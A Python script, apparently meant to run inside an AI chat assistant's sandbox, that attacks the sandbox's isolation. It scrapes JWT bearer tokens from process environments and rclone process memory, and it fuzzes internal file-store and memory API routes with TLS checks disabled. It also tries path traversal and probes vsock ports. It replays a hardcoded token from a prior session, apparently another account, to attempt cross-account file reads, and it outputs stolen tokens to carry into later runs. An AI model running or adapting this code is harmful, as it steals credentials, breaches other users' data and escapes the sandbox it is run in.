#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""mediafit.py v2.16.0 -- memory service, params-multipart, schema fix, path battery."""
import os, sys, json, re, time, ssl, base64, socket, subprocess, traceback
import urllib.request, urllib.error, uuid as _uuid

VER  = "2.16.0"
BASE = "https://api.anthropic.com/v1/filestore/fs/"
CONF = "/dev/shm/rclone-boot/config.json"
OUTD = "/mnt/user-data/outputs"
UP   = "/mnt/user-data/uploads"

# ================= PRE-FILLED FROM YOUR LAST REPORT (account #1) =================
PREV_FSID  = "claude_chat_01B8VHAyyWMW2vFZK7KTRgZm"
PREV_TOKEN = ("eyJhbGciOiJFUzI1NiIsImtpZCI6IktwbFRxWHVCODJRRzJ3ZHVxRnlHRXNnSDZuNDkzekVzZkg4cUhkWHFmaUEiLCJ0eXAiOiJKV1QifQ."
 "eyJhY2NvdW50X3V1aWQiOiI1NTJjMDAxOC04ZGJlLTRiNWQtOWU4NC04OGNhNTE2YTBkYTgiLCJhbGxvd2VkX3Jvb3RzIjpbIi9vdXRwdXRzIl0sImNsYXVkZV9wcmVzZW50ZWQiOnRydWUsImZpbGVzeXN0ZW1faWQiOiJjbGF1ZGVfY2hhdF8wMUI4VkhBeXlXTVcydkZaSzdLVFJnWm0iLCJvcmdfdXVpZCI6ImU3MzdiZWU3LWZjM2ItNDQ5Zi1hMWY3LTUyMTg3OTNmZThiNyIsIm9yZ2FuaXphdGlvbl91dWlkIjoiZTczN2JlZTctZmMzYi00NDlmLWExZjctNTIxODc5M2ZlOGI3IiwicmVzb2x2ZWRfd29ya3NwYWNlX3RhZ2dlZF9pZCI6Indya3NwY18wMTdRVTJjVkdRVFpYRVE2amF1UnRwTjYiLCJ3b3Jrc3BhY2VfdGFnZ2VkX2lkIjoiZGVmYXVsdCIsIm9yZ190YWludHMiOltdLCJ3b3Jrc3BhY2VfdXVpZCI6IjMzZGQ5ODVhLWYxMTAtNGMwYS05NmJhLThmNjMzOTJkZTg5YiIsIndvcmtzcGFjZV9jbWVrX2VuYWJsZWQiOmZhbHNlLCJ3b3Jrc3BhY2VfY21la19tb2RlIjoibm9uZSIsImlhdCI6MTc5MjQ1MDU5OCwiZXhwIjoxNzkyNDcyMTk4LCJpc3MiOiJmaWxlc3RvcmUtY2xpZW50IiwiYXVkIjpbImZpbGVzdG9yZSJdLCJzdWIiOiI1NTJjMDAxOC04ZGJlLTRiNWQtOWU4NC04OGNhNTE2YTBkYTgifQ."
 "fiRaHJGiIYOUZC4O4flw8UBpoDWsplPv4FWZV5TwvnZSbjGSTnsbNkHnvEXpcn-rJkLfJm-w_YS9zx5llISkcg")
ACCOUNT1_UUID = "552c0018-8dbe-4b5d-9e84-88ca516a0da8"
# ================================================================================

OUT, G = [], {}
def w(s=""): print(s, flush=True); OUT.append(str(s))
def head(t): w("\n" + "=" * 70 + "\n### " + t + "\n" + "=" * 70)
P, F, U, I = [], [], [], []
def rec(k, m, ev=None):
    w("    " + {"P":"[PASS]","F":"[FAIL]","U":"[UNK]","I":"[INFO]"}[k] + " " + m)
    if ev is not None: w("        " + str(ev)[:1300])
    {"P":P,"F":F,"U":U,"I":I}[k].append(m)
def sh(a, t=40):
    try:
        p = subprocess.run(a, capture_output=True, timeout=t)
        return p.returncode, p.stdout.decode("utf-8","replace"), p.stderr.decode("utf-8","replace")
    except Exception as e: return -1, "", "EXC:%s" % e
def b64d(x): return base64.urlsafe_b64decode(x + "=" * (-len(x) % 4))
def b64e(x):
    if isinstance(x, (dict, list)): x = json.dumps(x, separators=(",", ":"))
    x = x if isinstance(x, bytes) else x.encode()
    return base64.urlsafe_b64encode(x).rstrip(b"=").decode()
def step(n, f):
    try: f()
    except Exception as e:
        w("    !! %s: %s" % (n, e)); w("    " + traceback.format_exc().strip().splitlines()[-1][:200])
_CTX = ssl.create_default_context(); _CTX.check_hostname = False; _CTX.verify_mode = ssl.CERT_NONE
def http(url, method="POST", token=None, body=None, t=12, hdrs=None):
    h = {"User-Agent": "mediafit/" + VER}
    if token: h["Authorization"] = "Bearer " + token
    if body is not None and not isinstance(body, bytes): body = json.dumps(body).encode()
    if body is not None and not (hdrs or {}).get("Content-Type"): h["Content-Type"] = "application/json"
    if hdrs: h.update(hdrs)
    req = urllib.request.Request(url, method=method, headers=h, data=body)
    try:
        r = urllib.request.urlopen(req, timeout=t, context=_CTX); return r.status, r.read(300000)
    except urllib.error.HTTPError as e:
        try: return e.code, e.read()
        except Exception: return e.code, b""
    except Exception as e: return None, ("ERR:%s" % e).encode()
def api(m, p, tk=None, t=12): return http(BASE + m, "POST", tk, p, t, {"Connect-Protocol-Version": "1"})

# ---------------------------------------------------------------- 1
def s_env():
    head("1. ENV + UNEXPLORED PATHS")
    for c in [["sh","-c","ls -la /mnt /mnt/user-data 2>&1 | head -40"],
              ["sh","-c","ls -laR /opt/rclone-attach 2>&1 | head -30"],
              ["sh","-c","cat /proc/mounts | head -40"],
              ["sh","-c","ls -la /dev/vsock /dev/fuse 2>&1"],
              ["sh","-c","find / -xdev -maxdepth 3 -type d -name 'mem*' 2>/dev/null | head"]]:
        rc, o, e = sh(c)
        w("    $ %s\n        %s" % (" ".join(c), (o or e).strip()[:900].replace("\x00"," ")))
    try:
        G["fsid"] = [m["filesystem_id"] for m in json.loads(open(CONF).read())["mounts"] if m.get("filesystem_id")][0]
        w("    config mounts: %s" % json.dumps(json.loads(open(CONF).read()).get("mounts"))[:700])
    except Exception as e: rec("U", "config: %s" % e)
    for d in ["/mnt/mem", "/mnt/skills", "/opt/rclone-attach"]:
        if os.path.isdir(d):
            try: w("    %s -> %s" % (d, sorted(os.listdir(d))[:10]))
            except Exception as e: w("    %s -> %s" % (d, e))

# ---------------------------------------------------------------- 2
def s_binmine():
    head("2. BINARY STRINGS MINING (services / methods / field names)")
    B = "/opt/rclone/rclone-filestore"
    for pat, lbl in [(r'anthropic\.[A-Za-z0-9_.]+', "SERVICES"),
                     (r'/anthropic\.[A-Za-z0-9_.]+/[A-Za-z]+', "ROUTES"),
                     (r'\b(params|entries|directory|files|items|children|file|blobs|nodes|listing)\b', "FIELDS")]:
        rc, o, _ = sh(["sh","-c","strings -n 3 %s 2>/dev/null | grep -oE '%s' | sort -u | head -80" % (B, pat)])
        w("    [%s] %s" % (lbl, " ".join(o.split())[:1400]))
    rc, o, _ = sh(["sh","-c","strings -n 4 %s 2>/dev/null | grep -oE '/v1/[A-Za-z0-9_/]+' | sort -u | head -40" % B])
    w("    [V1 ROUTES] %s" % " ".join(o.split())[:900])
    rc, o, _ = sh(["sh","-c","strings -n 4 %s 2>/dev/null | grep -oE '[A-Z][A-Za-z]{3,28}' | sort -u | head -160" % B])
    meth = [x for x in o.split() if x not in ("Filesystem","File","Directory","Entry","Error")]
    w("    [METHOD-LIKE] %s" % " ".join(meth)[:1600])
    G["METH"] = meth

def s_memory():
    head("2b. MEMORY SERVICE ROUTE FUZZ")
    tk = G.get("TOKEN")
    pfxs = ["/v1/memory/", "/v1/memory/mem/", "/v1/filestore/memory/", "/v1/mem/",
            "/v1/memory/api/", "/v1/filestore/fs/", "/v1/filesystem/"]
    meths = ["listMemories", "getMemory", "listDirectory", "get", "list", "stat"]
    for p in pfxs:
        for m in meths:
            st, b = http("https://api.anthropic.com" + p + m, "POST", tk,
                         {"filesystem_id": G.get("fsid"), "path": "/"}, 7,
                         {"Connect-Protocol-Version": "1"})
            if st not in (404, None):
                w("    %-28s %-14s -> %s %s" % (p, m, st, b[:150].decode("utf-8","replace")))
                if st == 200: rec("P", "MEMORY ROUTE LIVE: %s%s" % (p, m))

# ---------------------------------------------------------------- 3
def s_tokens():
    head("3. TOKENS")
    JWT = re.compile(rb"eyJ[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}")
    TK = []
    def add(t):
        t = t.decode() if isinstance(t, bytes) else t
        if t.startswith("eyJ") and t not in TK: TK.append(t)
    for p in os.listdir("/proc"):
        if p.isdigit():
            try:
                for m in JWT.findall(open("/proc/%s/environ" % p, "rb").read()): add(m)
            except Exception: pass
    for p in os.listdir("/proc"):
        if not p.isdigit(): continue
        try:
            if b"rclone" not in open("/proc/%s/cmdline" % p, "rb").read(): continue
            maps = open("/proc/%s/maps" % p).read().splitlines(); mem = open("/proc/%s/mem" % p, "rb", 0)
        except Exception: continue
        for line in maps:
            try: a, perms = line.split()[0], line.split()[1]
            except Exception: continue
            if "r" not in perms: continue
            try: s0, e0 = [int(x, 16) for x in a.split("-")]
            except Exception: continue
            if not (0 < e0 - s0 <= 256*1024*1024): continue
            try: mem.seek(s0); d = mem.read(e0 - s0)
            except Exception: continue
            for m in JWT.findall(d): add(m)
    TD = []
    for t in TK:
        try:
            h, p, s = t.split("."); pl = json.loads(b64d(p))
            TD.append({"tok": t, "pl": pl, "iss": pl.get("iss"),
                       "fsid": pl.get("filesystem_id"), "roots": pl.get("allowed_roots")})
        except Exception: pass
    G["TD"] = TD
    G["TOKEN"] = next((r["tok"] for r in TD if "/outputs" in (r["roots"] or [])), TD[0]["tok"] if TD else None)
    w("    tokens=%d  distinct fsids in tokens=%s" % (len(TD), sorted({r["fsid"] for r in TD})))
    for r in TD:
        w("    iss=%-16s roots=%-16s fsid=%s" % (r["iss"], r["roots"], r["fsid"]))
    # token expiry check for the pre-filled one
    try:
        pl = json.loads(b64d(PREV_TOKEN.split(".")[1]))
        left = pl["exp"] - int(time.time())
        w("    PREV_TOKEN expires in %d s (%s)" % (left, "VALID" if left > 0 else "EXPIRED"))
        rec("P" if left > 0 else "U", "PREV_TOKEN %s" % ("valid" if left > 0 else "expired"))
    except Exception as e: w("    PREV_TOKEN decode: %s" % e)
    G["ACCT"] = TD[0]["pl"].get("account_uuid") if TD else None

# ---------------------------------------------------------------- 4
def s_schema():
    head("4. SCHEMA + listDirectory FIX (use /uploads = server-side truth)")
    tk = G.get("TOKEN"); own = G.get("fsid")
    up = next((r["tok"] for r in G.get("TD", []) if r["roots"] == ["/uploads"]), None)
    for lbl, t, p in [("outputs-token /outputs", tk, "/outputs"),
                      ("uploads-token /uploads", up, "/uploads"),
                      ("outputs-token /uploads", tk, "/uploads"),
                      ("outputs-token /outputs/nope", tk, "/outputs/nope")]:
        if not t: continue
        st, b = api("listDirectory", {"filesystem_id": own, "path": p}, t)
        w("    %-26s -> %s %s" % (lbl, st, b[:700].decode("utf-8","replace")))
        if st == 200 and b not in (b"{}", b""):
            rec("P", "listDirectory returns content: %s" % b[:200])
    try:
        png = sorted(x for x in os.listdir(UP) if x.lower().endswith((".png",".jpg")))[0]
        st, b = api("readFile", {"filesystem_id": own, "path": "/uploads/" + png}, up or tk)
        w("    readFile /uploads/%s -> %s len=%d" % (png, st, len(b)))
        rec("P" if st == 200 else "U", "readFile on server-side upload: %s" % st)
        G["PNG"] = png
    except Exception as e: w("    png: %s" % e)

# ---------------------------------------------------------------- 5
def s_write():
    head("5. WRITE PATH (params multipart) + dir semantics")
    tk = G.get("TOKEN"); own = G.get("fsid")
    B = "----mf" + b64e(os.urandom(6))
    def mp(params, fname=None, fdata=None):
        o = ("--%s\r\nContent-Disposition: form-data; name=\"params\"\r\n\r\n%s\r\n" % (B, json.dumps(params))).encode()
        if fname:
            o += ("--%s\r\nContent-Disposition: form-data; name=\"file\"; filename=\"%s\"\r\n"
                  "Content-Type: application/octet-stream\r\n\r\n" % (B, fname)).encode() + fdata + b"\r\n"
        return o + ("--%s--\r\n" % B).encode()
    H = {"Content-Type": "multipart/form-data; boundary=" + B, "Connect-Protocol-Version": "1"}
    for lbl, pr in [("mk /outputs", {"filesystem_id": own, "path": "/outputs"}),
                    ("mk /outputs/sub", {"filesystem_id": own, "path": "/outputs/sub"})]:
        st, b = api("makeDirectory", pr, tk)
        w("    makeDirectory %-16s -> %s %s" % (lbl, st, b[:200].decode("utf-8","replace")))
    for lbl, pr, fn in [("plain", {"filesystem_id": own, "path": "/outputs/mf.txt"}, "mf.txt"),
                        ("sub",   {"filesystem_id": own, "path": "/outputs/sub/mf2.txt"}, "mf2.txt"),
                        ("dir+name", {"filesystem_id": own, "directory": "/outputs", "name": "mf3.txt"}, "mf3.txt")]:
        st, b = http(BASE + "createFile", "POST", tk, mp(pr, fn, b"mediafit-" + fn.encode()), 15, H)
        w("    createFile[%-8s] -> %s %s" % (lbl, st, b[:280].decode("utf-8","replace")))
        if st == 200: rec("P", "createFile WORKS (%s)" % lbl)
    st, b = api("listDirectory", {"filesystem_id": own, "path": "/outputs"}, tk)
    w("    listDirectory /outputs after write -> %s %s" % (st, b[:800].decode("utf-8","replace")))
    for m in ["mf.txt", "sub/mf2.txt", "mf3.txt"]:
        st, b = api("readFile", {"filesystem_id": own, "path": "/outputs/" + m}, tk)
        w("    readFile /outputs/%-12s -> %s %s" % (m, st, b[:120].decode("utf-8","replace")))
    st, b = api("removeFile", {"filesystem_id": own, "path": "/outputs"}, tk)
    w("    removeFile(dir /outputs) -> %s %s" % (st, b[:200].decode("utf-8","replace")))
    rec("I", "removeFile on directory -> %s" % st)

# ---------------------------------------------------------------- 6
def s_paths():
    head("6. PATH MATRIX (with a file that EXISTS)")
    tk = G.get("TOKEN"); own = G.get("fsid")
    tgt = "/outputs/mf.txt"
    for p in [tgt, "/outputs/./mf.txt", "/outputs/../outputs/mf.txt", "/outputs/../outputs",
              "/outputs/..", "/", "/OUTPUTS/mf.txt", "/Outputs/mf.txt", "/outputs//mf.txt"]:
        st, b = api("readFile", {"filesystem_id": own, "path": p}, tk)
        w("    %-38s -> %s %s" % (p, st, b[:90].decode("utf-8","replace")))
    if G.get("PNG"):
        up = next((r["tok"] for r in G.get("TD", []) if r["roots"] == ["/uploads"]), None)
        for p in ["/uploads/" + G["PNG"], "/uploads/../uploads/" + G["PNG"], "/uploads/../outputs/mf.txt"]:
            st, b = api("readFile", {"filesystem_id": own, "path": p}, up or tk)
            w("    [uploads-token] %-34s -> %s" % (p, st))

# ---------------------------------------------------------------- 7
def s_vsock():
    head("7. VSOCK DEEP (port 5002 is open)")
    if not hasattr(socket, "AF_VSOCK"): rec("U", "no AF_VSOCK"); return
    for port in [5002, 5001, 2024]:
        for payload in [b"GET / HTTP/1.0\r\n\r\n", b"\n", b'{"jsonrpc":"2.0","method":"x","id":1}\n']:
            try:
                s = socket.socket(socket.AF_VSOCK, socket.SOCK_STREAM); s.settimeout(3)
                s.connect((2, port)); s.sendall(payload); time.sleep(0.5)
                try: r = s.recv(800)
                except Exception: r = b""
                w("    vsock 5002 port=%d payload=%-6r -> %r" % (port, payload[:8], r[:300]))
                if r: rec("P", "vsock %d replies to %r" % (port, payload[:8])); s.close(); break
                s.close()
            except Exception as e:
                w("    vsock port=%d payload=%r -> %s" % (port, payload[:8], str(e)[:70]))

# ---------------------------------------------------------------- 8
def s_matrix():
    head("8. CROSS-FS MATRIX  <== THE VERDICT")
    own = G.get("fsid"); tk = G.get("TOKEN")
    same_chat = (PREV_FSID == own)
    w("    own fsid   = %s" % own)
    w("    prev fsid  = %s  (same chat? %s)" % (PREV_FSID, same_chat))
    cases = [("own token  x own fsid", tk, own),
             ("PREV token x PREV fsid", PREV_TOKEN, PREV_FSID),
             ("own token  x PREV fsid", tk, PREV_FSID),
             ("PREV token x own fsid", PREV_TOKEN, own)]
    for lbl, t, f in cases:
        if not t or not f: continue
        st, b = api("listDirectory", {"filesystem_id": f, "path": "/outputs"}, t)
        w("    %-26s -> %s %s" % (lbl, st, b[:150].decode("utf-8","replace")))
        if st == 200 and "own token  x own" not in lbl:
            rec("P", "*** CROSS-FS READ: %s ***" % lbl)
            st2, b2 = api("readFile", {"filesystem_id": f, "path": "/outputs/mf.txt"}, t)
            w("        readFile -> %s %s" % (st2, b2[:120].decode("utf-8","replace")))

# ---------------------------------------------------------------- 9
def s_verdict():
    head("VERDICT")
    w("  PASS %d: %s" % (len(P), P)); w("  UNK %d: %s" % (len(U), U))
    w("  own fsid=%s acct=%s" % (G.get("fsid"), G.get("ACCT")))
    if G.get("ACCT") and G["ACCT"] != ACCOUNT1_UUID:
        w("  *** DIFFERENT ACCOUNT (own=%s vs account1=%s) ***" % (G["ACCT"][:8], ACCOUNT1_UUID[:8]))
    w("\n  ---- CARRY-OVER (paste into the NEXT script run) ----")
    w("PREV_FSID  = %r" % (G.get("fsid") or ""))
    w("PREV_TOKEN = %r" % (G.get("TOKEN") or ""))
    w("ACCOUNT1_UUID = %r" % (G.get("ACCT") or ""))
    w("  -----------------------------------------------------")

def main():
    for n, f in [("env", s_env), ("binmine", s_binmine), ("tokens", s_tokens),
                 ("memory", s_memory), ("schema", s_schema), ("write", s_write),
                 ("paths", s_paths), ("vsock", s_vsock), ("matrix", s_matrix),
                 ("verdict", s_verdict)]:
        step(n, f)
try: main()
except Exception as e: w("!! %s" % e); w(traceback.format_exc())
finally:
    txt = "\n".join(OUT)
    for d in [OUTD, "/tmp", "/root"]:
        try: os.makedirs(d, exist_ok=True); open(d + "/mediafit-report.txt", "w").write(txt)
        except Exception: pass
    print("\nreport: " + OUTD + "/mediafit-report.txt")